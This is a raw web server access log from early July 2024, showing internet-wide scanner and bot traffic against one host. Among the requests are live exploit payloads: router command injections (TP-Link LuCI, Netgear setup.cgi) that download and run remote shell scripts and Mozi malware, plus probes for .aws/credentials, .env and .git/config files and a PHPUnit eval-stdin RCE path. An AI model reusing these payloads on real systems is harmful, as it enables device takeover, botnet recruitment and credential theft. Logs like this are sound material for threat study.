78.153.140.177 - - [03/Jul/2024:23:14:38 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\xB5\x12\xFF\x0E\x88\x80\x81CjYP\xF8j\x22.\xAC\x06\x09_M-\xFF\x087P\x99\xD9}\xF1X\xF3\x99 \xC1$\xE3\xC4\xBDv!\x90\xD9\xC5\xAA\xFD\xDC?\x1DwF\x9CO\xBBw\xAE<\x0E\x17\xE9\x9A\x0F\xCDi9\x8A\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 154 "-" "-"
78.153.140.177 - - [03/Jul/2024:23:14:39 +0000] "GET /.aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [03/Jul/2024:23:14:40 +0000] "GET /.aws/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [03/Jul/2024:23:14:41 +0000] "GET /aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [03/Jul/2024:23:14:42 +0000] "GET /test.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [03/Jul/2024:23:14:43 +0000] "GET /phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [03/Jul/2024:23:14:44 +0000] "GET /_profiler/phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [03/Jul/2024:23:14:45 +0000] "GET /phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [03/Jul/2024:23:14:48 +0000] "GET /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.249.48.222 - - [03/Jul/2024:23:26:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
198.235.24.175 - - [03/Jul/2024:23:45:26 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.249.48.222 - - [03/Jul/2024:23:46:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
83.97.73.245 - - [03/Jul/2024:23:46:57 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
46.19.143.66 - - [03/Jul/2024:23:47:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [04/Jul/2024:00:02:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.74 - - [04/Jul/2024:00:15:40 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
83.97.73.245 - - [04/Jul/2024:00:18:08 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.249.48.222 - - [04/Jul/2024:00:22:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.196.9.227 - - [04/Jul/2024:00:24:05 +0000] "GET /.git/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO A57 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044813 Mobile Safari/537.36 MMWEBID/6886 MicroMessenger/7.0.6.1460(0x27000634) Process/tools NetType/WIFI Language/zh_CN"
179.43.161.135 - - [04/Jul/2024:00:24:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
64.62.197.32 - - [04/Jul/2024:00:26:10 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03" 400 154 "-" "-"
14.116.254.172 - - [04/Jul/2024:00:39:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
45.156.130.2 - - [04/Jul/2024:00:59:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
46.19.143.66 - - [04/Jul/2024:01:01:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
157.66.54.6 - - [04/Jul/2024:01:02:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
157.66.54.6 - - [04/Jul/2024:01:02:23 +0000] "" 400 0 "-" "-"
141.98.83.197 - - [04/Jul/2024:01:02:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.128.43 - - [04/Jul/2024:01:36:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.249.48.197 - - [04/Jul/2024:01:44:05 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+sh%3B+wget+http%3A%2F%2F185.216.70.121%2Fsh%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
109.205.213.198 - - [04/Jul/2024:01:47:21 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
92.249.48.202 - - [04/Jul/2024:01:56:05 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
109.205.213.198 - - [04/Jul/2024:01:56:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
64.62.156.49 - - [04/Jul/2024:01:59:59 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41"
64.62.156.42 - - [04/Jul/2024:02:01:30 +0000] "GET /webui/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
64.62.156.49 - - [04/Jul/2024:02:01:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
64.62.156.47 - - [04/Jul/2024:02:02:58 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
64.62.156.51 - - [04/Jul/2024:02:03:45 +0000] "GET /geoserver/web/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41"
139.59.3.86 - - [04/Jul/2024:02:07:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
162.142.125.32 - - [04/Jul/2024:02:09:33 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
162.142.125.32 - - [04/Jul/2024:02:09:47 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
139.59.3.86 - - [04/Jul/2024:02:13:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
139.59.3.86 - - [04/Jul/2024:02:13:09 +0000] "" 400 0 "-" "-"
46.19.143.66 - - [04/Jul/2024:02:16:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
192.46.227.180 - - [04/Jul/2024:02:24:51 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.46.227.180 - - [04/Jul/2024:02:24:52 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.46.227.180 - - [04/Jul/2024:02:24:52 +0000] "GET /sendgrid/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.46.227.180 - - [04/Jul/2024:02:24:52 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.71.229.49 - - [04/Jul/2024:02:47:58 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC4^\xEE\x98\xE2z|\x8EI.]" 400 154 "-" "-"
167.71.229.49 - - [04/Jul/2024:02:47:58 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xAC\x83\x10 \x89H\x84\x91\xAB\xCA\x97\xEC\xE6\xC5\xC0\x82\xA3C\xAE\xAF&\x00\xE4\xD2\x90\xA8\x18\x87\x0B\xE6\xDB\xF2\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
167.71.229.49 - - [04/Jul/2024:02:47:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.229.49 - - [04/Jul/2024:02:47:58 +0000] "GET /form.html HTTP/1.1" 301 166 "-" "curl/8.1.2"
167.71.229.49 - - [04/Jul/2024:02:47:58 +0000] "GET /upl.php HTTP/1.1" 301 166 "-" "Mozilla/5.0"
167.71.229.49 - - [04/Jul/2024:02:47:59 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03(\xC5\x97G\x10J\x9FAw\xE4J\x22XS\xAD\xAF\xF2o\xD9{$x\x02W\x13\xA1\xD6\xFCSi\x88\xA3\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
167.71.229.49 - - [04/Jul/2024:02:47:59 +0000] "GET /geoip/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.229.49 - - [04/Jul/2024:02:47:59 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.229.49 - - [04/Jul/2024:02:47:59 +0000] "GET /1.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.229.49 - - [04/Jul/2024:02:47:59 +0000] "GET /bundle.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.229.49 - - [04/Jul/2024:02:47:59 +0000] "GET /files/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.229.49 - - [04/Jul/2024:02:47:59 +0000] "GET /systembc/password.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.229.49 - - [04/Jul/2024:02:47:59 +0000] "GET /password.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.229.49 - - [04/Jul/2024:02:47:59 +0000] "GET /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
141.98.83.197 - - [04/Jul/2024:03:27:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.66 - - [04/Jul/2024:03:29:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
220.158.232.58 - - [04/Jul/2024:03:41:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
220.158.232.58 - - [04/Jul/2024:03:41:31 +0000] "" 400 0 "-" "-"
181.41.196.15 - - [04/Jul/2024:03:55:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
43.159.128.149 - - [04/Jul/2024:04:05:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
92.249.48.197 - - [04/Jul/2024:04:24:56 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
162.216.150.107 - - [04/Jul/2024:04:31:26 +0000] "GET / HTTP/1.1" 301 166 "http://180.233.121.154:1081/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
46.174.191.31 - - [04/Jul/2024:04:42:51 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
46.19.143.66 - - [04/Jul/2024:04:44:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
192.46.227.180 - - [04/Jul/2024:05:14:34 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
192.46.227.180 - - [04/Jul/2024:05:14:34 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
104.152.52.23 - - [04/Jul/2024:05:22:44 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
216.173.67.179 - - [04/Jul/2024:05:51:18 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
46.19.143.66 - - [04/Jul/2024:05:53:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
179.43.161.135 - - [04/Jul/2024:05:58:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.197 - - [04/Jul/2024:06:06:42 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
216.173.67.179 - - [04/Jul/2024:06:09:45 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
172.206.142.142 - - [04/Jul/2024:06:13:12 +0000] "GET /portal/redlion HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
182.44.12.37 - - [04/Jul/2024:06:13:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
141.98.83.197 - - [04/Jul/2024:06:25:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
182.42.110.255 - - [04/Jul/2024:06:37:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
178.62.6.43 - - [04/Jul/2024:06:49:05 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03l\xEB\xD0\xDD\x1B\x9E\x81\xDE\xB8\x9F\x9E\xEF_\xB1P%\x8F\xD3\x9C\xCF^\xA2\x94\xDD\x0E\xBD\xB5\x05\x01\xCEd\xC6\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 154 "-" "-"
185.224.128.43 - - [04/Jul/2024:06:59:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.66 - - [04/Jul/2024:07:07:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
134.122.58.72 - - [04/Jul/2024:07:11:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
134.122.58.72 - - [04/Jul/2024:07:11:37 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.128.232.194 - - [04/Jul/2024:07:14:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.194 - - [04/Jul/2024:07:14:45 +0000] "" 400 0 "-" "-"
179.43.161.135 - - [04/Jul/2024:07:19:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.156.128.47 - - [04/Jul/2024:07:25:50 +0000] "GET /owncloud/status.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.128.47 - - [04/Jul/2024:07:25:51 +0000] "GET /status.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.242.226.10 - - [04/Jul/2024:07:39:55 +0000] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.26.0"
95.181.234.7 - - [04/Jul/2024:07:55:36 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
104.197.132.31 - - [04/Jul/2024:07:56:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
92.249.48.202 - - [04/Jul/2024:07:56:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.94.138.115 - - [04/Jul/2024:07:57:00 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
167.94.138.115 - - [04/Jul/2024:07:57:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.115 - - [04/Jul/2024:07:57:13 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
167.71.1.38 - - [04/Jul/2024:08:03:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
66.249.77.12 - - [04/Jul/2024:08:06:17 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.77.11 - - [04/Jul/2024:08:06:29 +0000] "GET /ads.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.159.101.214 - - [04/Jul/2024:08:09:16 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.101.214 - - [04/Jul/2024:08:09:17 +0000] "GET /ads.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.101.214 - - [04/Jul/2024:08:09:18 +0000] "GET /app-ads.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.101.214 - - [04/Jul/2024:08:09:18 +0000] "GET /sellers.json HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
46.19.143.66 - - [04/Jul/2024:08:22:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
162.142.125.43 - - [04/Jul/2024:08:33:52 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
162.142.125.43 - - [04/Jul/2024:08:34:06 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
141.98.83.197 - - [04/Jul/2024:08:34:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
34.76.96.55 - - [04/Jul/2024:09:24:53 +0000] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.32.2"
46.19.143.66 - - [04/Jul/2024:09:38:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
138.199.10.24 - - [04/Jul/2024:09:43:47 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "panscient.com"
138.199.10.24 - - [04/Jul/2024:09:43:47 +0000] "GET / HTTP/1.1" 301 166 "-" "panscient.com"
66.240.205.34 - - [04/Jul/2024:09:47:03 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 154 "-" "-"
123.13.48.68 - - [04/Jul/2024:09:50:25 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.13.48.68:55117/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 166 "-" "-"
104.40.88.227 - - [04/Jul/2024:10:01:51 +0000] "MGLNDD_180.233.121.154_80" 400 154 "-" "-"
109.205.213.198 - - [04/Jul/2024:11:11:33 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
109.205.213.198 - - [04/Jul/2024:11:17:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
185.224.128.43 - - [04/Jul/2024:11:57:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.236.28.175 - - [04/Jul/2024:11:59:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
46.19.143.66 - - [04/Jul/2024:12:05:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
139.59.3.86 - - [04/Jul/2024:12:13:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
141.98.83.197 - - [04/Jul/2024:12:28:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
77.90.7.23 - - [04/Jul/2024:13:02:26 +0000] "GET http://example.com/ HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
77.90.7.23 - - [04/Jul/2024:13:02:26 +0000] "CONNECT hanisntsolo.github.io:443 HTTP/1.1" 400 154 "-" "-"
77.90.7.23 - - [04/Jul/2024:13:02:27 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
77.90.7.23 - - [04/Jul/2024:13:02:27 +0000] "GET http://example.com/ HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
77.90.7.23 - - [04/Jul/2024:13:02:28 +0000] "CONNECT example.com:443 HTTP/1.1" 400 154 "-" "-"
77.90.7.23 - - [04/Jul/2024:13:02:28 +0000] "CONNECT hanisntsolo.github.io:443 HTTP/1.1" 400 154 "-" "-"
46.19.143.66 - - [04/Jul/2024:13:18:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
109.205.213.198 - - [04/Jul/2024:13:21:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.126.213 - - [04/Jul/2024:14:01:29 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
178.159.37.16 - - [04/Jul/2024:14:18:33 +0000] "GET /archivarix.cms.php HTTP/1.1" 301 166 "http://gangagetaways.com/archivarix.cms.php" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion"
20.172.38.178 - - [04/Jul/2024:14:19:28 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
20.172.38.178 - - [04/Jul/2024:14:19:29 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
46.19.143.66 - - [04/Jul/2024:14:31:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
